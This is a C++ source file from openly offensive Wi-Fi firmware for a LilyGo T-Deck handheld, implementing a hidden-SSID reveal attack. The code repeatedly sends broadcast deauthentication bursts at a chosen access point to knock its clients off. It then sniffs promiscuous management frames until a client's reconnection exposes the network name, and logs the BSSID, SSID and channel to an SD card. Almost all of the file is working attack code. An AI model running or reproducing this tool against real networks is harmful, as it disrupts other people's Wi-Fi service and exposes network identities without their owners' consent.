// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh

#include "hidden_ssid.h"
#include "input_handling.h"
#include "wifimon_functions.h"
#include "utilities.h"
#include "sdcard_manager.h"
#include "lockscreen_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <driver/i2s.h>
#include <math.h>

extern InputHandling inputHandler;
extern SDCardManager sdCardManager;

// ── Globals shared with promiscuous callback ──────────────────────────────────

static volatile bool    g_hsFound = false;
static volatile char    g_hsSsid[33];
static volatile uint8_t g_hsBssid[6];

// ── Promiscuous RX callback ───────────────────────────────────────────────────

static void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t pktType) {
    if (pktType != WIFI_PKT_MGMT || g_hsFound) return;

    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* p   = pkt->payload;
    int      len = pkt->rx_ctrl.sig_len;

    if (len < 24) return;

    uint8_t frameType    = (p[0] & 0x0C) >> 2;
    uint8_t frameSubtype = (p[0] & 0xF0) >> 4;

    if (frameType != 0) return;

    // Probe response (5) and assoc request (0) carry the AP SSID and have AP BSSID at bytes 16-21
    if (frameSubtype != 0 && frameSubtype != 5) return;

    // BSSID field sits at bytes 16–21 in all management frames
    if (memcmp(p + 16, (const void*)g_hsBssid, 6) != 0) return;

    char ssid[33] = {0};
    WiFiMonitor::extractSSID(p, len, frameSubtype, ssid);
    if (ssid[0] != '\0') {
        memcpy((void*)g_hsSsid, ssid, strlen(ssid) + 1);
        g_hsFound = true;
    }
}

// ── Rising two-tone beep (1 kHz → 2 kHz, 250 ms each) ────────────────────────
static void playBeep() {
    i2s_config_t cfg = {};
    cfg.mode                 = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_TX);
    cfg.sample_rate          = 22050;
    cfg.bits_per_sample      = I2S_BITS_PER_SAMPLE_16BIT;
    cfg.channel_format       = I2S_CHANNEL_FMT_RIGHT_LEFT;
    cfg.communication_format = I2S_COMM_FORMAT_STAND_I2S;
    cfg.intr_alloc_flags     = ESP_INTR_FLAG_LEVEL1;
    cfg.dma_buf_count        = 8;
    cfg.dma_buf_len          = 128;
    cfg.use_apll             = false;
    cfg.tx_desc_auto_clear   = true;
    if (i2s_driver_install(I2S_NUM_0, &cfg, 0, NULL) != ESP_OK) return;
    i2s_pin_config_t pins = {};
    pins.mck_io_num   = I2S_PIN_NO_CHANGE;
    pins.bck_io_num   = BOARD_I2S_BCK;
    pins.ws_io_num    = BOARD_I2S_WS;
    pins.data_out_num = BOARD_I2S_DOUT;
    pins.data_in_num  = I2S_PIN_NO_CHANGE;
    if (i2s_set_pin(I2S_NUM_0, &pins) != ESP_OK) { i2s_driver_uninstall(I2S_NUM_0); return; }
    const int SR = 22050;
    const int freqs[] = { 1000, 2000 };
    for (int f : freqs) {
        int cycLen = SR / f;
        if (cycLen > 256) cycLen = 256;
        int16_t buf[512] = {0};
        for (int i = 0; i < cycLen; i++) {
            int16_t v = (int16_t)(20000 * sinf(2.0f * M_PI * i / cycLen));
            buf[i * 2] = v; buf[i * 2 + 1] = v;
        }
        size_t wr;
        uint32_t t0 = millis();
        while (millis() - t0 < 250)
            i2s_write(I2S_NUM_0, buf, cycLen * 4, &wr, pdMS_TO_TICKS(50));
        i2s_zero_dma_buffer(I2S_NUM_0);
    }
    i2s_driver_uninstall(I2S_NUM_0);
}

// ── Class implementation ──────────────────────────────────────────────────────

HiddenSSID::HiddenSSID(DisplayManager& dm, WiFiFunctions& wf, DeauthAttack& da)
    : _dm(dm), _wf(wf), _da(da) {}

bool HiddenSSID::parseMac(const char* str, uint8_t* mac) {
    if (!str || strlen(str) < 17) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

String HiddenSSID::macStr(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(buf);
}

void HiddenSSID::start(char* args) {
    if (!args || !*args) {
        _dm.setCursor(10, _dm.getCursorY());
        _dm.println("Usage:");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.println("  hs <index> [silent]");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.println("  hs <bssid> [ch] [silent]");
        _dm.printCommandScreen();
        return;
    }

    char buf[128];
    strncpy(buf, args, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* first  = strtok(buf, " ");
    char* second = strtok(nullptr, " ");
    char* third  = strtok(nullptr, " ");

    auto isSilentArg = [](const char* s) {
        return s && (strcmp(s, "silent") == 0 || strcmp(s, "s") == 0);
    };

    uint8_t bssid[6];
    int     channel = 6;
    bool    silent  = false;

    if (strchr(first, ':') == nullptr) {
        // Index mode: hs <idx> [silent]
        int idx = atoi(first);
        if (!_wf.isScanDone()) {
            _dm.setCursor(10, _dm.getCursorY());
            _dm.println("Run scanwifi first.");
            _dm.printCommandScreen();
            return;
        }
        if (!_wf.getNetworkInfo(idx, bssid, &channel)) {
            _dm.setCursor(10, _dm.getCursorY());
            _dm.printText("Invalid index. Max: ");
            _dm.println(_wf.getNetworkCount() - 1);
            _dm.printCommandScreen();
            return;
        }
        if (isSilentArg(second)) silent = true;
    } else {
        // BSSID mode: hs <bssid> [ch] [silent]
        if (!parseMac(first, bssid)) {
            _dm.setCursor(10, _dm.getCursorY());
            _dm.println("Bad BSSID. Format: XX:XX:XX:XX:XX:XX");
            _dm.printCommandScreen();
            return;
        }
        if (second) {
            if (isSilentArg(second)) {
                silent = true;
            } else {
                int ch = atoi(second);
                if (ch >= 1 && ch <= 13) channel = ch;
                if (isSilentArg(third)) silent = true;
            }
        }
    }

    run(bssid, channel, silent);
}

void HiddenSSID::run(const uint8_t* bssid, int channel, bool silent) {
    g_hsFound   = false;
    g_hsSsid[0] = '\0';
    memcpy((void*)g_hsBssid, bssid, 6);

    // Same WiFi setup deauth uses — AP interface needed for 80211_tx injection
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP("x", nullptr, channel, 1, 0, false);
    delay(100);

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCb);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    delay(50);

    // ── UI ───────────────────────────────────────────────────────────────────
    _dm.clearScreen();
    _dm.setCursor(10, outputY);
    _dm.setTextColor(0x7BEF);    _dm.printText("[");
    _dm.setTextColor(TFT_CYAN);  _dm.printText("SCAN");
    _dm.setTextColor(0x7BEF);    _dm.printText("::");
    _dm.setTextColor(TFT_YELLOW);_dm.println("HIDDEN]");
    _dm.printSeparator();
    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF);    _dm.printText("Target  ");
    _dm.setTextColor(TFT_WHITE);  _dm.println(macStr(bssid).c_str());
    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF);    _dm.printText("Channel ");
    _dm.setTextColor(TFT_WHITE);  _dm.println(channel);
    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF);    _dm.printText("Deauth + sniff...  [q] stop");
    if (silent) { _dm.setTextColor(TFT_YELLOW); _dm.printText("  [MUTE]"); }
    _dm.println();
    _dm.setTextColor(TFT_WHITE);

    int32_t  counterY  = _dm.getCursorY();
    uint32_t bursts    = 0;
    uint32_t lastBurst = 0;

    // ── Main loop ────────────────────────────────────────────────────────────
    bool notified = false;
    bool sdSaved  = false;

    while (true) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            _dm.clearScreen();
            _dm.setCursor(10, outputY);
            _dm.setTextColor(0x7BEF);    _dm.printText("[");
            _dm.setTextColor(TFT_CYAN);  _dm.printText("SCAN");
            _dm.setTextColor(0x7BEF);    _dm.printText("::");
            _dm.setTextColor(TFT_YELLOW);_dm.println("HIDDEN]");
            _dm.printSeparator();
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(0x7BEF);    _dm.printText("Target  ");
            _dm.setTextColor(TFT_WHITE);  _dm.println(macStr(bssid).c_str());
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(0x7BEF);    _dm.printText("Channel ");
            _dm.setTextColor(TFT_WHITE);  _dm.println(channel);
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(0x7BEF);    _dm.printText("Deauth + sniff...  [q] stop");
            if (silent) { _dm.setTextColor(TFT_YELLOW); _dm.printText("  [MUTE]"); }
            _dm.println();
            _dm.setTextColor(TFT_WHITE);
            counterY = _dm.getCursorY();
            lastBurst = 0;  // force immediate status redraw
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        if (g_hsFound && !notified) {
            notified = true;
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            esp_wifi_set_promiscuous(false);
            if (!silent) playBeep();

            // Save BSSID→SSID mapping to SD (skip if already on file)
            char macBuf[18];
            snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
            _wf.refreshHiddenCache();
            if (_wf.isHiddenKnown(bssid)) {
                sdSaved = true;  // already in the database
            } else {
                sdCardManager.ensureDir(SD_DIR_HIDDENSSID);
                sdSaved = sdCardManager.appendLine(SD_LOG_HIDDEN_SSIDS,
                              String(macBuf) + "," + String((const char*)g_hsSsid) + "," + String(channel));
            }

            _dm.fillRect(10, counterY, 310, LINE_HEIGHT * 2 + 4, TFT_BLACK);
            _dm.setCursor(10, counterY);
            _dm.setTextColor(0x7BEF);    _dm.printText("[");
            _dm.setTextColor(TFT_GREEN); _dm.printText("FOUND");
            _dm.setTextColor(0x7BEF);    _dm.printText("] SSID: ");
            _dm.setTextColor(TFT_GREEN); _dm.println((const char*)g_hsSsid);
            _dm.setCursor(10, counterY + LINE_HEIGHT);
            _dm.setTextColor(0x7BEF);    _dm.printText("[q] quit  ");
            _dm.setTextColor(sdSaved ? TFT_GREEN : TFT_RED);
            _dm.println(sdSaved ? "[SD] saved" : "[SD] failed");
        }

        if (!g_hsFound) {
            uint32_t now = millis();
            if (now - lastBurst >= 3000) {
                _da.sendBroadcastBurst(bssid);
                bursts++;
                lastBurst = now;

                _dm.fillRect(10, counterY, 310, LINE_HEIGHT + 2, TFT_BLACK);
                _dm.setCursor(10, counterY);
                _dm.setTextColor(0x7BEF);
                _dm.printText("Bursts: ");
                _dm.setTextColor(TFT_YELLOW);
                _dm.printText((int)bursts);
                _dm.setTextColor(0x7BEF);
                _dm.printText("  waiting for probe...");
                _dm.setTextColor(TFT_WHITE);
            }
        }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // ── Cleanup ──────────────────────────────────────────────────────────────
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);

    // ── Result ───────────────────────────────────────────────────────────────
    _dm.clearScreen();
    _dm.setCursor(10, outputY);

    if (g_hsFound) {
        _dm.setTextColor(0x7BEF);    _dm.printText("[");
        _dm.setTextColor(TFT_GREEN);  _dm.printText("FOUND");
        _dm.setTextColor(0x7BEF);    _dm.println("::SSID]");
        _dm.printSeparator();
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);    _dm.printText("SSID    ");
        _dm.setTextColor(TFT_GREEN);  _dm.println((const char*)g_hsSsid);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);    _dm.printText("Target  ");
        _dm.setTextColor(TFT_WHITE);  _dm.println(macStr(bssid).c_str());
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);    _dm.printText("Bursts  ");
        _dm.setTextColor(TFT_WHITE);  _dm.println((int)bursts);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);    _dm.printText("SD      ");
        _dm.setTextColor(sdSaved ? TFT_GREEN : TFT_RED);
        _dm.println(sdSaved ? "saved" : "no card / failed");
        delay(6000);
    } else {
        _dm.setTextColor(TFT_YELLOW); _dm.println("[STOP] no SSID captured");
        _dm.setTextColor(TFT_WHITE);
        delay(2000);
    }

    _dm.tdeck_begin();
}
